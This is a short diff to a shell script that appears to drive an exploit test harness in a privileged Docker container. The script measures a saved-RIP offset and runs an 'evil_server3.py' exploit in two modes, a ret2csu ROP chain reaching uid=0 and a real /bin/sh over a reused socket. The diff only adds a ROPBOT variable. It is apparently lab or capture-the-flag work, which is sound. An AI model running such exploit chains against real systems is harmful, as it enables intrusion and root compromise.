@@ -20,8 +20,8 @@ docker run --rm --platform=linux/amd64 --privileged "$IMAGE" bash -lc '
   OFF=$(python3 exploit/find_offset.py)
   echo "[*] measured saved-RIP offset = $OFF"
   echo "[*] === MODE=marker (ret2csu rdx + flags=0 wrappers -> uid=0) ==="
-  OFFSET=$OFF python3 exploit/evil_server3.py
+  ROPBOT=${ROPBOT:-0} OFFSET=$OFF python3 exploit/evil_server3.py
   echo "[*] === MODE=shell (real /bin/sh over the reused socket) ==="
-  OFFSET=$OFF MODE=shell python3 exploit/evil_server3.py
+  ROPBOT=${ROPBOT:-0} OFFSET=$OFF MODE=shell python3 exploit/evil_server3.py
   echo "[*] both modes passed."
 '
